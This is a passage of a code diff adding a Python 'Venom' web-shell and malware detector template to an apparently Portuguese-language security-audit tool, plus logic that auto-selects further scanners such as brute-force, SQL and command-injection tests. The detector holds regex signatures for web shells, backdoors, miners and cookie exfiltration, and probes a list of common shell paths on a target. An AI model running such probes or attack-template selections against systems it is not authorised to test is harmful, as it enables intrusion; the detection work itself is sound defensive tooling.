+║  Propósito: Detectar web shells, backdoors e malware injetado║
+║  Alvo: ${url}
+║  Uso: python venom_detector.py [URL]                         ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import sys, json, re, requests
+from datetime import datetime
+from urllib.parse import urljoin
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 10
+HEADERS = {"User-Agent": "BlueTeam-VenomDetector/1.0"}
+
+# Assinaturas de web shells conhecidos
+WEBSHELL_SIGNATURES = {
+    "PHP web shell": [r"eval\\(base64_decode", r"system\\(\\$_(?:GET|POST|REQUEST)",
+                      r"passthru\\(", r"shell_exec\\(\\$_", r"exec\\(\\$_",
+                      r"<?php.*\\$_(?:GET|POST|REQUEST)\\[.*\\].*(?:eval|system|exec)",
+                      r"c99shell", r"r57shell", r"phpspy"],
+    "Python backdoor": [r"import socket.*exec", r"subprocess\\.Popen.*shell=True",
+                        r"os\\.system\\(request", r"exec\\(request\\."],
+    "JSP shell":       [r"Runtime\\.getRuntime\\(\\)\\.exec", r"<%.*request\\.getParameter.*exec"],
+    "Obfuscated JS":   [r"eval\\(atob\\(", r"eval\\(unescape\\(",
+                        r"String\\.fromCharCode\\([\\d,\\s]{30,}\\)",
+                        r"\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}"],
+    "Crypto miner":    [r"coinhive", r"cryptonight", r"monero", r"mining_key",
+                        r"CoinHive\\.Anonymous", r"xmrig"],
+    "Malicious iframe": [r'<iframe[^>]+src=["\\'](https?://[^"\\'>]{10,})',
+                          r'<iframe.*style=["\\']*display\\s*:\\s*none'],
+    "Redirect malware": [r'window\\.location\\s*=\\s*["\\'](https?://[^"\\'>]{10,})',
+                          r'document\\.location\\.href\\s*=\\s*["\\'](https?://)'],
+    "Data exfil":       [r'new Image.*\\.src.*(?:cookie|document\\.cookie)',
+                          r'fetch.*cookie.*evil', r'navigator\\.sendBeacon.*cookie'],
+}
+
+SUSPICIOUS_FILES = [
+    "/shell.php", "/cmd.php", "/backdoor.php", "/c99.php", "/r57.php",
+    "/b374k.php", "/webshell.php", "/upload.php", "/eval.php",
+    "/shell.aspx", "/cmd.aspx", "/backdoor.aspx",
+    "/tmp/shell.php", "/uploads/shell.php",
+    "/.hidden/shell.php", "/images/shell.php",
+    "/js/analytics.php", "/includes/shell.php",
+    "/api/shell", "/api/exec", "/api/cmd",
+]
+
+def scan_content(content, source):
+    findings = []
+    for shell_type, patterns in WEBSHELL_SIGNATURES.items():
+        for pattern in patterns:
+            try:
+                if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
+                    findings.append({
+                        "type": shell_type,
+                        "source": source,
+                        "pattern": pattern[:50],
+                        "severity": "CRITICAL",
+                    })
+                    print(f"  🔴 {shell_type} detectado em {source}!")
+                    break
+            except Exception:
+                pass
+    return findings
+
+def check_integrity(base):
+    """Verifica integridade de arquivos JS/CSS principais."""
+    findings = []
+    try:
+        r = requests.get(base, timeout=TIMEOUT, verify=False, headers=HEADERS)
+        # Extrai scripts
+        scripts = re.findall(r'<script[^>]+src=["\\']((?!http)[^"\\'>]+)', r.text)
+        for script in scripts[:10]:
+            script_url = urljoin(base, script)
+            try:
+                rs = requests.get(script_url, timeout=TIMEOUT, verify=False, headers=HEADERS)
+                script_findings = scan_content(rs.text, script)
+                findings.extend(script_findings)
+            except Exception:
+                pass
+        # Varre página principal
+        main_findings = scan_content(r.text, "index.html")
+        findings.extend(main_findings)
+    except Exception as e:
+        findings.append({"error": str(e)[:40]})
+    return findings
+
+def check_suspicious_files(base):
+    found = []
+    print("[*] Procurando web shells e arquivos suspeitos...")
+    for path in SUSPICIOUS_FILES:
+        url = base.rstrip("/") + path
+        try:
+            r = requests.get(url, timeout=5, verify=False, headers=HEADERS)
+            if r.status_code == 200 and len(r.text) > 10:
+                found.append({"path": path, "status": r.status_code,
+                               "size": len(r.text), "severity": "CRITICAL"})
+                print(f"  🔴 Arquivo suspeito acessível: {path} ({len(r.text)} bytes)")
+        except Exception:
+            pass
+    return found
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Venom / Malicious Payload Detector              ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    all_findings = []
+
+    print("[*] Analisando código-fonte em busca de malware...")
+    content_findings = check_integrity(base)
+    all_findings.extend(content_findings)
+    if not content_findings:
+        print("  ✅ Nenhum payload malicioso no código-fonte principal")
+
+    print()
+    suspicious_files = check_suspicious_files(base)
+    all_findings.extend(suspicious_files)
+    if not suspicious_files:
+        print("  ✅ Nenhum web shell encontrado")
+
+    print()
+    print("=" * 64)
+    criticals = [f for f in all_findings if f.get("severity") == "CRITICAL"]
+    print(f"  Payloads detectados: {len(all_findings)} | Críticos: {len(criticals)}")
+    if not all_findings:
+        print("  ✅ Nenhum malware ou web shell detectado!")
+    else:
+        print()
+        print("  ⚠️  AÇÃO IMEDIATA NECESSÁRIA:")
+        print("     • Remova arquivos suspeitos imediatamente")
+        print("     • Analise logs de acesso para identificar origem")
+        print("     • Audite todos os arquivos no servidor")
+        print("     • Reporte ao time de segurança e ao bug bounty")
+
+    output = {"target": base, "timestamp": datetime.now().isoformat(),
+              "total": len(all_findings), "findings": all_findings}
+    with open("venom_detector_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: venom_detector_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
   xss_scanner: {
     id: 'xss_scanner',
     name: 'XSS & Injection Scanner',
@@ -1796,17 +3619,28 @@ function selectRelevantScripts(auditResults) {
   selected.add('headers_analyzer');
   selected.add('ssl_analyzer');
   selected.add('credential_scanner');
+  selected.add('metasploit_enum');
 
   // Baseado em vulnerabilidades encontradas
   if (failChecks.some(c => c.includes('route') || c.includes('hidden') || c.includes('endpoint'))) selected.add('route_scanner');
+  if (failChecks.some(c => c.includes('brute') || c.includes('rate') || c.includes('lockout') || c.includes('hydra'))) selected.add('hydra_bruteforce');
   if (failChecks.some(c => c.includes('brute') || c.includes('rate') || c.includes('lockout'))) selected.add('brute_force_test');
   if (failChecks.some(c => c.includes('ddos') || c.includes('dos') || c.includes('slowloris'))) selected.add('dos_test');
   if (failChecks.some(c => c.includes('xss') || c.includes('inject') || c.includes('redirect'))) selected.add('xss_scanner');
+  if (failChecks.some(c => c.includes('sql') || c.includes('inject') || c.includes('query'))) selected.add('sql_injection');
   if (failChecks.some(c => c.includes('credential') || c.includes('.env') || c.includes('key') || c.includes('bundle'))) selected.add('credential_scanner');
+  if (failChecks.some(c => c.includes('csrf') || c.includes('cors') || c.includes('samesite'))) selected.add('csrf_tester');
+  if (failChecks.some(c => c.includes('jwt') || c.includes('token') || c.includes('auth'))) selected.add('jwt_analyzer');
+  if (failChecks.some(c => c.includes('ssrf') || c.includes('redirect') || c.includes('fetch'))) selected.add('ssrf_scanner');
+  if (failChecks.some(c => c.includes('command') || c.includes('exec') || c.includes('rce'))) selected.add('cmd_injection');
+  if (failChecks.some(c => c.includes('xml') || c.includes('xxe') || c.includes('upload'))) selected.add('xxe_scanner');
+  if (failChecks.some(c => c.includes('phishing') || c.includes('email') || c.includes('spf') || c.includes('dmarc'))) selected.add('phishing_analyzer');
+  if (failChecks.some(c => c.includes('malware') || c.includes('shell') || c.includes('backdoor'))) selected.add('venom_detector');
 
-  // Se não encontrou vulnerabilidades específicas, inclui todos
-  if (selected.size < 3) {
-    Object.keys(SCRIPT_TEMPLATES).forEach(k => selected.add(k));
+  // Se não encontrou vulnerabilidades específicas, inclui seleção completa
+  if (selected.size < 5) {
+    ['route_scanner', 'hydra_bruteforce', 'sql_injection', 'jwt_analyzer', 'ssrf_scanner',
+     'csrf_tester', 'cmd_injection', 'venom_detector', 'phishing_analyzer'].forEach(k => selected.add(k));
   }
 
   return [...selected];
